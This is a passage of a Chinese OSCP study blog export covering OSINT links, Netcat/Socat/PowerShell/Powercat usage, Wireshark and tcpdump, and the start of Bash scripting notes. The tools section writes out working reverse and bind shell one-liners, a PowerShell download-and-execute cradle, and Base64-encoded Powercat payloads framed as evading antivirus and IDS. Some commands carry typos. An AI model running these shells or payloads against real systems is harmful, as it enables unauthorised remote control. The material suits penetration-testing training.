title="社交媒体工具"></a>社交媒体工具</h1><ul><li><a href="https://www.social-searcher.com/">https://www.social-searcher.com/</a></li></ul><h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><ul><li><a href="https://stackoverflow.com/">https://stackoverflow.com/</a></li></ul><h1 id="信息收集框架"><a href="#信息收集框架" class="headerlink" title="信息收集框架"></a>信息收集框架</h1><ul><li>OSINT Fraamework<ul><li><a href="https://osintframework.com/">https://osintframework.com/</a></li></ul></li><li>Maltego<ul><li>未完待续…</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-实用工具</title>
      <link href="2021/02/17/OSCP-%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>2021/02/17/OSCP-%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Practical-Tools"><a href="#Practical-Tools" class="headerlink" title="Practical Tools"></a>Practical Tools</h1><blockquote><p>经常使用工具：Netcat  Socat  Powershell Wireshark  Tcpdump</p></blockquote><h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h4><blockquote><p>我们可以使用客户端模式连接到任何Tcp/Udp端口，能够允许我们：</p><ul><li>检查端口是否打开或者关闭</li><li>从监听端口的服务读取横幅</li><li>手动连接到网络服务</li></ul></blockquote><ul><li><p>例1：检查Tcp端口110是否在其中一个服务器打开</p><ul><li>-n :跳过DNS名称解析</li><li>-v :添加一些详细信息，目标地址和目标端口号</li></ul><pre><code class="shell">nc -nv 10.11.0.22 110</code></pre></li></ul><h4 id="2-侦听Tcp-Udp端口"><a href="#2-侦听Tcp-Udp端口" class="headerlink" title="2. 侦听Tcp/Udp端口"></a>2. 侦听Tcp/Udp端口</h4><ul><li>-l :指定监听器</li><li>-p:指定端口号</li></ul><pre><code class="shell">server#nc -nlvp 4444client#nc -nv 10.11.0.22 4444</code></pre><h4 id="3-使用Netcat传输文件"><a href="#3-使用Netcat传输文件" class="headerlink" title="3. 使用Netcat传输文件"></a>3. 使用Netcat传输文件</h4><blockquote><p>Netcat还可以用于将文本和二进制文件从一台机器传输到另一台机器 Kali –&gt; windows</p></blockquote><pre><code class="shell">windows#nc -nlvp 4444 &gt; incoming.exekali#locate wget.exekali#nc -nv 10.11.0.22 4444 &lt; /use/share/wget.exewindows#nc -nlvp 4444 &gt; incoming.exewindows#incoming.exe -h</code></pre><h4 id="4-Netcat远程管理"><a href="#4-Netcat远程管理" class="headerlink" title="4. Netcat远程管理"></a>4. Netcat远程管理</h4><blockquote><p>-e 在建立或接受成功后执行程序</p><p>启用时，此选项可以将可执行文件的输入，输出和错误消息重定向到Tcp/Udp端口而不是默认控制台</p></blockquote><h5 id="1-Netcat绑定shell场景"><a href="#1-Netcat绑定shell场景" class="headerlink" title="1:) Netcat绑定shell场景"></a>1:) Netcat绑定shell场景</h5><pre><code class="shell">windows#nc -nlvp 4444 -e cmd.exekali#nc -nv 10.11.0.22 4444</code></pre><h5 id="2-反向shell场景"><a href="#2-反向shell场景" class="headerlink" title="2:) 反向shell场景"></a>2:) 反向shell场景</h5><pre><code class="shell">windows#nc -lnvp 4444kali#nc -nv 10.11.0.22 -e /bin/bash</code></pre><h4 id="5-Exercises"><a href="#5-Exercises" class="headerlink" title="5.Exercises"></a>5.Exercises</h4><ul><li>实现windows与kali的聊天</li><li>使用Netcat创建：<ul><li>Kali到windows的反向shell</li><li>windows到kali的反向shell</li><li>在kali绑定shell，使用windows连接</li><li>在windows绑定shell,使用kali连接</li></ul></li><li>windows与kali互传文件</li><li>开启防火墙练习</li></ul><h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><h4 id="1-连接远程服务器的端口"><a href="#1-连接远程服务器的端口" class="headerlink" title="1. 连接远程服务器的端口"></a>1. 连接远程服务器的端口</h4><pre><code class="shell">nc &lt;remote server's IP address&gt; 80socat TCP4:&lt;remote server's IP address&gt;:80</code></pre><p>语法相似，但是Socat需要传输数据和STDIO之间和远程主机和协议。协议选项和端口号以冒号分割</p><pre><code class="shell">sudo nc -lvp localhost 443sudo socat TCP-LISTEN:443 STDIO</code></pre><h4 id="2-Socat文件传输"><a href="#2-Socat文件传输" class="headerlink" title="2. Socat文件传输"></a>2. Socat文件传输</h4><blockquote><p>TCP4-LISTEN 指定IPV4侦听</p><p>fork 会在与侦听器建立连接后创建一个子进程允许多线程</p><p>file: 指定要传输文件的名称</p></blockquote><pre><code class="shell">kali#sudo socat TCP4-LISTEN:443,fork file:secret_password.txt</code></pre><blockquote><p>file: 指定要将文件保存到指定计算机上的本地文件名</p><p>create 指定将创建一个新文件</p></blockquote><pre><code class="shell">windows#socat TCP4:10.11.0.22:443 file:received_secret_password.txt,create </code></pre><h4 id="3-Socat反向shell"><a href="#3-Socat反向shell" class="headerlink" title="3. Socat反向shell"></a>3. Socat反向shell</h4><blockquote><p>-d -d :增加详细性（显示致命错误，警告和通知）</p><p>STDIO：使用stdio进行连接到Tcp套接字的标准输出</p></blockquote><pre><code class="shell">windows#socat -d -d TCP4-LISTEN:443 STDIO</code></pre><blockquote><p>EXEC：建立远程连接后，给定指定程序，类似于nc -e</p></blockquote><pre><code class="shell">kali#socat TCP4:10.11.0.22:443 EXEC:/bin/bash</code></pre><h4 id="4-Socat加密绑定shell"><a href="#4-Socat加密绑定shell" class="headerlink" title="4. Socat加密绑定shell"></a>4. Socat加密绑定shell</h4><blockquote><p>向绑定shell添加加密，我们可以使用安全套接字认证这个级别的加密将有助于规避入侵检测系统（IDS）隐藏敏感信息</p></blockquote><p>Openssl工具参数<span class="github-emoji"><span>🐙</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f419.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>req</td><td>启动新的证书签名请求</td></tr><tr><td>-newkey</td><td>生成一个新的私钥</td></tr><tr><td>rsa2048</td><td>使用密钥长度为2048位的RSA加密</td></tr><tr><td>-nodes</td><td>存储没有密码保护的私钥</td></tr><tr><td>-keyout</td><td>将密钥保存到文本</td></tr><tr><td>-xseq</td><td>输出自签名证书而不是证书请求</td></tr><tr><td>-days</td><td>以天为单位设置有效期</td></tr><tr><td>-out</td><td>将证书保存到文件中</td></tr></tbody></table><blockquote><p>一旦我们生成密钥，我们将把证书和他的私钥放在一个文件中，我们将最终用来加密我们绑定的shell</p></blockquote><p><strong>步骤一</strong></p><pre><code class="shell">openssl req -newkey ras:2048 -nodes -keyout bind_shell.key -x509 -day 362 -out bind_shell.crt</code></pre><blockquote><p>转换为Socat会接受的格式.pem文件在创建加密的socat侦听器</p></blockquote><p><strong>步骤二</strong></p><pre><code class="shell">cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code></pre><p><strong>步骤三</strong></p><blockquote><p>openssl-listen  创建侦听器</p><p>cert=bind_shell.pem  指定证书文件</p><p>verify = 0     禁用SSL证书验证</p></blockquote><pre><code class="shell">sudo socat openssl-listen:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code></pre><p><strong>步骤四</strong></p><pre><code class="shell">socat openssl:10.0.11.22:443,verify=0</code></pre><h4 id="5-Exercises-1"><a href="#5-Exercises-1" class="headerlink" title="5. Exercises"></a>5. Exercises</h4><ul><li>使用socat传输文件，kali–&gt;windows</li><li>使用socat穿件一个从windows–&gt;kali反向加密shell</li><li>在windows上创建加密的绑定shell，试着从kali连接，没有加密还可以用?</li><li>在windows上创建未加密的socat绑定shell,使用连接到shell的NC，有用吗？</li></ul><h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><blockquote><p><strong>WindowsPowerShell是一种基于任务的命令行shell和脚本语言。它是专门为系统管理员和高级用户设计的快速自动化多个操作系统（Linux、macOS、Unix和Windows）以及与在其上运行的应用程序。</strong></p></blockquote><blockquote><p>PowerShell是一个强大的渗透测试工具，可以安装在（或者是）默认情况下安装在各种版本的Windows上。<strong>它默认安装在现代Windows上以Windows Server 2008 R2和Windows 7开始的平台。</strong></p><p>Windows PowerShell 5.0运行在以下版本的Windows上：</p><ul><li>Windows Server 2016，默认安装</li><li>Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 with sp1/Windows 8.1/Windows 7 sp1 (安装 Framework 5.0) </li></ul><p>Windows PowerShell 4.0在以下版本的Windows上运行：</p><ul><li>Windows 8.1/Windows Server 2012 R2, 默认安装</li><li>Windows 7 sp1/Windows Server 2008 R2 sp1 (安装 Framework 4.0) </li></ul><p>Windows PowerShell 3.0在以下版本的Windows上运行：</p><ul><li>Windows 8/Windows Server 2012, 默认安装</li><li>Windows 7 sp 1/Windows Server 2008 R2 sp 1/2 (安装 Framework 3.0)</li></ul><p>PowerShel包含一个内置的集成开发环境（IDE），称为Windows PowerShell集成脚本环境(ISE)。ISE是Windows的主机应用程序它使我们能够在一个基于windows的图形用户界面中运行命令、编写、测试和调试脚本。该界面提供多行编辑、制表符完成、语法着色、选择性执行、上下文相关帮助、支持从右向左的语言等：PowerShell维护一个执行策略,用于确定哪种类型的PowerShell脚本(如果有的话)可以在系统上运行。默认策略为“受限”，这实际上意味着系统既不会加载PowerShell配置文件，也不会运行PowerShell脚本。为此目的模块,我们需要在我们的Windows客户端计算机上设置一个无限制的执行策略。为此，我们单击Windows开始按钮，右键单击Windows PowerShe应用程序,然后选择以管理员身份运行。出现“用户帐户控制”提示时，选择“是”,然后单击“确定”并且输入：Set-ExecutionPolicy Unrestricted</p></blockquote><p><img src="https://s3.ax1x.com/2021/02/18/yR39Jg.png"></p><pre><code class="shell">Windows PowerShell版权所有 (C) Microsoft Corporation。保留所有权利。尝试新的跨平台 PowerShell https://aka.ms/pscore6PS C:\WINDOWS\system32&gt; set-executionpolicy unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): YPS C:\WINDOWS\system32&gt;</code></pre><blockquote><p>PowerShell响应迅速且功能强大，使我们能够在没有任何问题的情况下正在目标上执行多个任务或者安装其他工具。让我们更深入地了解一下PowerShell，以演示它是如何工作的以及可能在渗透测试中起作用。</p></blockquote><h4 id="1-Powershell文件传输"><a href="#1-Powershell文件传输" class="headerlink" title="1. Powershell文件传输"></a>1. Powershell文件传输</h4><blockquote><p>由于PowerShell的强大功能和灵活性，这并不像使用Netcat甚至socat它那样直截了当,使这些最初的几个命令乍一看有点混乱。我们将执行命令，然后分解组件：</p></blockquote><pre><code class="shell">powershell -c "(new-object System.Net.Webclient).DownloadFile('http://192.168.50.25:8080/nc2.exe','C:\Users\FaLao\Desktop\nc2.exe')"</code></pre><blockquote><p>我们可以看到命令被执行了,文件被传输了,而且执行起来没有任何意外.让我们分析一下导致这种情况发生的PowerShell命令。首先,我们使用了-c选项。这将执行提供的命令(用双引号括起来)就像是在PowerShell提示符下输入的一样。</p><p>我们正在执行的命令包含几个组件。首先，我们使用”new-object”它允许我们实例化.Net Framework或COM对象.在这种情况下,创建WebClient类的实例,该类在System.Net namespace。WebClient类用于访问由URI标识的资源，并且公开一个名为DownloadFile的公共方法，该方法需要两个关键参数：源位置(如前所述,以URI的形式)以及检索数据将被存储。</p><p>这种语法看起来很混乱,但实际上相当简单.接下来是WebClient类,最后是DownloadFile方法,以可视化使用的类和方法的结构</p></blockquote><h4 id="2-Powershell反弹shell"><a href="#2-Powershell反弹shell" class="headerlink" title="2. Powershell反弹shell"></a>2. Powershell反弹shell</h4><blockquote><p>我们将利用PowerShell one-liners执行shell，从一个反向shell开始。</p></blockquote><pre><code class="shell">kali#sudo nc -nlvp 443</code></pre><p><img src="https://s3.ax1x.com/2021/02/18/yRYJjH.png"></p><pre><code class="shell">$client = new-object System.Net.Sockets.TCPClient(192.168.50.25,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);    $sendback = (iex $data 2&gt;&amp;1 | Out-String);    $sendback2 = $sendback + 'PS' + (pwd).Path + '&gt;';    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);    $stream.Write($sendbyte,0,$sendbyte.Length);    $stream.Flush();}$client.close();</code></pre><blockquote><p>该代码由几个用分号分隔的命令组成,第一个client变量，它被分配了目标IP地址、一个流变量、一个名为bytes的字节数组以及一段时间循环，然后调用关闭客户端连接.在while循环中,我们可以看到几行负责向网络流读写数据。请注意,**iex(“/nvokeExpression”)**是此代码块的关键部分，因为它作为命令运行接收到任何字符串然后，命令的结果被重定向并通过数据流发回。</p></blockquote><pre><code class="powershell">powershell -c "$client = new-object System.Net.Sockets.TCPClient('192.168.50.25',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String);$sendback2 = $sendback + 'PS' + (pwd).Path + '&gt;';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.close();"</code></pre><p><img src="https://s3.ax1x.com/2021/02/18/yRwZjO.png"></p><h4 id="3-Powershell绑定shell"><a href="#3-Powershell绑定shell" class="headerlink" title="3. Powershell绑定shell"></a>3. Powershell绑定shell</h4><blockquote><p>处理绑定shell时,此过程是相反的.我们首先绑定windows的电脑上的PowerShell，然后从kali的电脑使用Netcat连接到它。</p></blockquote><pre><code class="powershell">powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4433);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS' + (pwd).Path + '&gt;';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0, $sendbyte.Length);$stream.Flush()};$client.Close();$tistener.Stop()"</code></pre><blockquote><p>在代码中,使用-c选项将命令传递给powershell与反向shell一样,这个复杂的命令可以分解为几个命令。在除了client、stream和byte变量之外，我们还有一的listener变量，它使用System.Net.Sockets.TcpListener类。这个类需要两个参数：第一个是侦听，接着是端口。通过提供0.0.0.0作为本地地址，绑定的shell将可用于系统上的所有IP地址。同样，我们使用<strong>iex</strong>执行命令</p></blockquote><pre><code class="shell">nc -nvv 1.1.1.1 4433</code></pre><p><img src="https://s3.ax1x.com/2021/02/18/yRBf91.png"></p><h1 id="Powercat"><a href="#Powercat" class="headerlink" title="Powercat"></a>Powercat</h1><blockquote><p>Powercat本质上是由besimorhino编写的Netcat的PowerShell版本。它是一个我们需要的脚本可以下载到Windows主机以利用PowerShell的优势并简化创建绑定/反弹shell。</p></blockquote><p><strong>Powercat可以通过apt install Powercat安装在Kali中/usr/share/windows resources/powercat的脚本。</strong></p><ul><li>无网络连接情况下</li></ul><pre><code class="shell">┌──(root💀kali)-[/usr/share/windows-resources/powercat]└─# python2 -m SimpleHTTPServer 8080Serving HTTP on 0.0.0.0 port 8080 ...192.168.50.238 - - [18/Feb/2021 12:33:54] "GET /powercat.ps1 HTTP/1.1" 200 -PS C:\WINDOWS\system32&gt; powershell -c "(new-object System.Net.Webclient).DownloadFile('http://192.168.50.25:8080/powercat.ps1','C:\Windows\System32\powercat.ps1')"PS C:\WINDOWS\system32&gt; .空格.\powercat.ps1PS C:\WINDOWS\system32&gt; powercat -hpowercat - Netcat, The Powershell VersionGithub Repository: https://github.com/besimorhino/powercatThis script attempts to implement the features of netcat in a powershellscript. It also contains extra features such as built-in relays, executepowershell, and a dnscat2 client.Usage: powercat [-c or -l] [-p port] [options]...</code></pre><ul><li>有网络连接情况下</li></ul><pre><code class="shell">iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.psl')</code></pre><p><strong>这种方式加载的脚本只在当前的PowerShell中可用,每次重新启动PowerShell时都需要重新加载。</strong></p><h4 id="1-Powercat文件传输"><a href="#1-Powercat文件传输" class="headerlink" title="1. Powercat文件传输"></a>1. Powercat文件传输</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-c</td><td>指定一个侦听地址</td></tr><tr><td>-p</td><td>指定要连接的端口号</td></tr><tr><td>-l</td><td>创建侦听器</td></tr><tr><td>-v</td><td>显示详细信息</td></tr><tr><td>-i</td><td>表示本地文件将远程传输</td></tr><tr><td>-e</td><td>对连接到侦听端口的执行指定的应用程序</td></tr><tr><td>-g</td><td>程序重定向</td></tr></tbody></table><pre><code class="shell">kali#nc -lvvp 4444 &gt; receiving_powercat.ps1powershell&gt; powercat -c 192.168.50.25 -p 4444 -i C:\Users\FaLao\Desktop\123.txt</code></pre><h4 id="2-Powercat反弹shell"><a href="#2-Powercat反弹shell" class="headerlink" title="2. Powercat反弹shell"></a>2. Powercat反弹shell</h4><pre><code class="shell">kali#nc -lnvp 4444windows#powercat -c 192.168.50.25 -p 4444 -e cmd.exe</code></pre><h4 id="3-Powercat绑定shell"><a href="#3-Powercat绑定shell" class="headerlink" title="3. Powercat绑定shell"></a>3. Powercat绑定shell</h4><pre><code class="shell">windows#powercat -l -p 4444 -e cmd.exekali#nc -nv 192.168.50.238 4444</code></pre><h4 id="4-Powercat的Payload"><a href="#4-Powercat的Payload" class="headerlink" title="4. Powercat的Payload"></a>4. Powercat的Payload</h4><blockquote><p>Powercat还可以生成独立的有效负载。在Powercat中,有效负载是一个集合以及powercat脚本本身只包含用户请求的功能。</p></blockquote><pre><code class="shell">powercat -c 192.168.50.25 -p 4444 -e cmd.exe -g &gt; D:\reverseshell.ps1      </code></pre><blockquote><p>像这样的独立有效负载可能很容易被IDS检测到,生成的脚本相当大,大约有300行代码.还包含一些硬编码字符串,这些字符串很容易用于恶意代码的签名活动.虽然任何特定签名的标识都不在本模块的范围内，但是足以说明像这样的明文恶意代码很可能会有很差的成功率和安全性可能会被防御软件解决方案查出。可以尝试利用PowerShell执行Base64编码命令来解决.为了生成一个独立的编码负载，我们使用-ge选项再次将输出重定向到文件：</p></blockquote><pre><code class="shell">powercat -c 192.168.50.25 -p 4444 -e cmd.exe -ge &gt; D:\encodedreverseshell.ps1   #编码免杀</code></pre><blockquote><p>该文件将包含一个可使用PowerShell -E执行的编码字符串选项。但是，由于-E选项是作为提交命令行上的复杂命令编码器对应脚本不能为空,以与我们未编码的有效载荷相同的方式执行。相反,需要通过整个编码字符串到powershell -E 后面执行</p></blockquote><pre><code class="shell">kali#nv -lnvp 4444windows#powershell -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdA....</code></pre><h4 id="5-Exercises-2"><a href="#5-Exercises-2" class="headerlink" title="5. Exercises"></a>5. Exercises</h4><ul><li>使用powercat创建一个从Windows系统到Kali的反弹shell。</li><li>使用powercat生成一个编码的有效负载，然后通过反向shell发送到你的Kali，同时创建一个编码绑定在您的Windows系统上shell并使用您的Kali连接到它。</li></ul><h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><blockquote><p>一个称职的渗透测试人员应该精通网络基础知识。网络嗅探器，就像业界的主流Wireshark一样是学习网络协议的必备工具，分析网络流量，调试网络服务.</p></blockquote><h4 id="1-Wireshark基础知识"><a href="#1-Wireshark基础知识" class="headerlink" title="1. Wireshark基础知识"></a>1. Wireshark基础知识</h4><blockquote><p>Wireshark使用Ubpcap(在Linux上)或Winpcap(在Windows上)库来捕获来自网络的数据包。</p><p>当用嗅探器分析网络流量时，很容易被大量的垃圾包所淹没在收集的数据中。为了便于分析，我们可以使用捕获过滤和显示Wireshark内的filters如果我们在Wireshark会话期间应用捕获过滤器不匹配的筛选条件将被删除，剩余的数据将传递给捕获引擎。捕获引擎然后解析传入的数据包，分析它们，最后应用它们显示输出前的任何其他显示过滤器。</p><p>运行过程：<strong>网络–&gt;捕获过滤–&gt;捕获引擎–&gt;显示过滤</strong></p></blockquote><pre><code class="shell">┌──(root💀kali)-[~]└─# wireshark          #运行wireshark</code></pre><h4 id="2-捕获筛选器"><a href="#2-捕获筛选器" class="headerlink" title="2. 捕获筛选器"></a>2. 捕获筛选器</h4><blockquote><p>当Wireshark加载时，我们会看到一个基本窗口，在这里我们可以选择网络接口我们要监视的接口以及设置显示和捕获过滤器。如上所述，我们可以使用捕获筛选器可通过丢弃任何未捕获的流量来减少捕获的流量匹配我们的过滤器并将焦点缩小到我们希望分析的数据包。注意，任何交通从捕获筛选器中排除的内容将丢失，因此如果需要，如担心可能丢失数据，最好定义广泛的捕获筛选器。</p></blockquote><p><strong>我们将首先选择要监视的接口并输入捕获过滤器。使用</strong>net 10.11.1.0/24<strong>来捕获范围地址内的流量：</strong></p><p><img src="https://s3.ax1x.com/2021/02/18/yWFBuQ.png"></p><h4 id="3-显示过滤器"><a href="#3-显示过滤器" class="headerlink" title="3. 显示过滤器"></a>3. 显示过滤器</h4><blockquote><p>现在Wireshark已经捕获了本地网络上的所有流量，登录到FTP服务器检查网络状况</p></blockquote><pre><code class="shell">┌──(root💀kali)-[/home/laosec/桌面]└─# ftp 192.168.50.238Connected to 192.168.50.238.220 Name (192.168.50.238:laosec): admin331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.ftp&gt; </code></pre><p><img src="https://s3.ax1x.com/2021/02/18/yWkfit.png"></p><h4 id="4-跟踪TCP流"><a href="#4-跟踪TCP流" class="headerlink" title="4. 跟踪TCP流"></a>4. 跟踪TCP流</h4><blockquote><p>Wireshark允许查看网络流量，包括每个数据包的内容。然而，我们通常对不同应用程序之间的数据流更感兴趣。利用Wireshark的能力重新组合特定会话并以各种格式显示它。要查看特定的TCP流，我们可以右键单击感兴趣的数据包，例如在FTP会话中包含用户命令的数据包，然后选择Follow&gt;TCP stream</p></blockquote><p><img src="https://s3.ax1x.com/2021/02/18/yWErHH.png"></p><p><img src="https://s3.ax1x.com/2021/02/18/yWE4KS.png"></p><h4 id="5-Exercises-3"><a href="#5-Exercises-3" class="headerlink" title="5. Exercises"></a>5. Exercises</h4><ul><li>使用Wireshark在尝试使用Netcat连接到端口110上的10.11.1.217时捕获网络活动，然后尝试登录到该端口。</li><li>TCP的三次握手与关闭在哪些数据中</li><li>按照读取TCP流尝试登录。</li><li>使用显示过滤器仅监视端口110上的通信量。</li><li>运行新会话，使用捕获筛选器仅收集端口110上的流量。</li></ul><h1 id="TcpDump"><a href="#TcpDump" class="headerlink" title="TcpDump"></a>TcpDump</h1><blockquote><p>Tcpdump是一个基于文本的网络嗅探器，尽管缺乏图形界面，但它仍然是一个精简、强大和灵活的网络嗅探器。它是迄今为止最常用的命令行数据包分析器，可以在大多数Unix和Linux操作系统上找到，但是本地用户权限决定了捕获网络流量的能力。</p></blockquote><blockquote><p>Tcpdump既可以捕获来自网络的流量，也可以读取现有的捕获文件。filterd.pcap是在防火墙下载在我们分析数据的过程中，文件和跟踪。首先，我们将使用sudo启动tcpdump（以授予捕获权限），并使用-r选项打开文件</p></blockquote><pre><code class="shell">tcpdump -r filter.pcap</code></pre><h4 id="1-过滤流量"><a href="#1-过滤流量" class="headerlink" title="1. 过滤流量"></a>1. 过滤流量</h4><blockquote><p>首先，使用-n选项跳过DNS名称查找，使用-r从数据包捕获中读取数据文件。然后，我们可以将输出通过管道传输到awk，打印目标IP地址和端口（第三个空格分隔的字段）并再次通过管道对其进行排序，然后uniq-c对其进行排序和计数该字段分别出现在捕获中。最后，我们使用head只显示前10行</p></blockquote><pre><code class="shell">tcpdump -n -r filter.pcap | awk -f " " '{print $3}' | sort | uniq -c | head</code></pre><blockquote><p>为了从命令行进行过滤，我们将使用源主机（src host）和目标主机（dst-host）过滤器分别只输出源和目标流量。我们也可以过滤按端口号（-n port 81）显示端口87的源和目标通信量</p></blockquote><pre><code class="shell">kali#tcpdump -n src host 172.16.40.10 -r filter.pcapkali#tcpdump -n dst host 172.16.40.10 -r filter.pcapkali#tcpdump -n port 81 -r filter.pcap</code></pre><blockquote><p>为了转储捕获的流量，我们将使用-x选项以十六进制和十六进制打印数据包数据</p></blockquote><pre><code class="shell">tcpdump -nX -r filter.pcap</code></pre><blockquote><p>注意到，端口81上172.16.40.10的流量看起来像HTTP数据。实际上，这些HTTP请求似乎包含基本的HTTP身份验证数据，用户代理“Teh Forest Lobster·”用先进的头过滤。</p></blockquote><pre><code class="shell">kali# echo "$((2#88811888))"kali#tcpdump -A - n 'tcp[l3] = 24' -r filter.pcap</code></pre><h4 id="2-Exercises"><a href="#2-Exercises" class="headerlink" title="2. Exercises"></a>2. Exercises</h4><ul><li>使用tcpdump在端口110上重新创建捕获流量的Wireshark练习。</li><li>使用-x标志查看数据包的内容。如果数据被截断，请研究-s有何帮助。</li><li>在filter.pcap中查找所有“SYN”,“ACK”和“RST”数据包。</li></ul><p><span class="github-emoji"><span>🥇</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f947.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-Bash脚本</title>
      <link href="2021/02/16/OSCP-Bash%E8%84%9A%E6%9C%AC/"/>
      <url>2021/02/16/OSCP-Bash%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Bash-Scripting"><a href="#Bash-Scripting" class="headerlink" title="Bash Scripting"></a>Bash Scripting</h1><blockquote><p>Bash(GUN Bourne -Again)是许多Linux发行版本的Shell.Shell Script大致都类同，Shell Script通常可以在很多中shell上使用</p><p><strong>一个称职的安全专家熟练地利用Bash脚本来简化和自动化许多Linux任务和过程</strong></p></blockquote><h4 id="1-Bash脚本简介"><a href="#1-Bash脚本简介" class="headerlink" title="1. Bash脚本简介"></a>1. Bash脚本简介</h4><blockquote><p>Bash脚本为一个纯文本文件，其文件扩展名为sh(为了便于识别)以**#!/bin/bash**开头必须设置可执行权限才能执行</p><pre><code class="shell">chmod +x 1.sh    #给相对应的脚本添加可执行权限./1.sh           #运行当前目录下的1.sh脚本</code></pre></blockquote><pre><code class="shell">cat ./hello-world.sh#!/bin/bash  #是指此脚本使用/bin/bash来解释执行，#！是特殊的表示符号，后跟解释脚本的shell路径#Hello World Bash Script#用于添加注释，因此他后面的所有文本都忽略echo "hello world"   #打印输出字符串</code></pre><pre><code class="shell">cat /etc/shells #可以查看系统支持的shell格式</code></pre><ul><li><p>#!是对脚本的解释器路径，脚本的内容是由解释器解释的我们可以用各种各样的解释器来写脚本，比如/bin/csh</p></li><li><pre><code class="shell">name=vule    #变量声明格式first_name=Goodlast_name=Hackerecho $first_name $last_nameGood Hacker</code></pre></li><li><p>变量名是可以大写，小写或两者兼着有之，但是Bash是区分大小写的</p></li><li><p>Bash对单引号与双引号的处理方式不同，遇到单引号时Bash会逐字解释每个括起来的字符，当用双引号括起来是，除了“$”与“\”之外，所有字符都按照字面意思查看，这意味着变量所附文本的初始替换传递中展开<strong>双引号会解析变量，单引号不会</strong></p></li><li><p>我们可以将变量的值设置为命令或程序的结果，这被称为命令替换，他允许我们获取命令或程序的输出，将其保存成变量的值.</p><ul><li><p>例1：</p><pre><code class="shell">User=$(whoami)   #使用$()echo $Userroot</code></pre></li><li><p>例2：</p><pre><code class="shell">User=`whoami`  #使用反引号echo $Userroot</code></pre></li></ul></li><li><p>Backit方法比较久，通常不推荐使用，因为这两种命令替换方法的行为方式存在差异。</p></li><li><p>命令替换发生在子shell中，对子shell中变量的更改不会改变主进程种的变量</p><pre><code class="shell">#!/bin/bash -X        #bash打印额外的调试输出#---主进程变量---Var1=Value1echo $Var1Var2=Value2echo $Var2#---子shell中变量---$(Var1=newvar1)echo $Var1`Var2=newvar2`echo $var2#Var1与Var2到第二个声明发生在子shell中，并且没有像初始声明那样更改当前shell中的值</code></pre></li></ul><h4 id="2-位置变量与特殊变量"><a href="#2-位置变量与特殊变量" class="headerlink" title="2. 位置变量与特殊变量"></a>2. 位置变量与特殊变量</h4><table><thead><tr><th>Variable 